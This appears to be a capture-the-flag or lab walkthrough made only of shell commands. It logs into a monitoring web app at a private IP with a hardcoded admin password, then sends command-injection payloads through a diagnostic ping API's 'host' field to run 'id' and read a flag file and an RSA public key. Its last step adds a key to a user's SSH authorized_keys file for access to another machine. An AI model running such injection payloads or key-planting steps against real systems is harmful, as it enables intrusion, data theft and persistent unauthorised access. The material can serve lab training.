# Login via the floating IP (not 127.0.0.1)
curl -s -X POST http://172.24.4.51:8080/login \
  -c /tmp/cookies2.txt \
  -d "username=monitor_admin&password=S1GN4L%23Mon%21tor"

curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}'

curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/sigmon/classified/flag2.txt"}'

# On M2 — get the public key
curl -s -X POST http://172.24.4.51:8080/api/diagnostic/ping \
  -b /tmp/cookies2.txt \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; cat /opt/monitor/keys/sigops_rsa.pub"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['stdout'])"

# On M3 — install the public key for sigops
echo "<PASTE_PUBLIC_KEY_HERE>" >> /home/sigops/.ssh/authorized_keys
chmod 600 /home/sigops/.ssh/authorized_keys
chown sigops:sigops /home/sigops/.ssh/authorized_keys
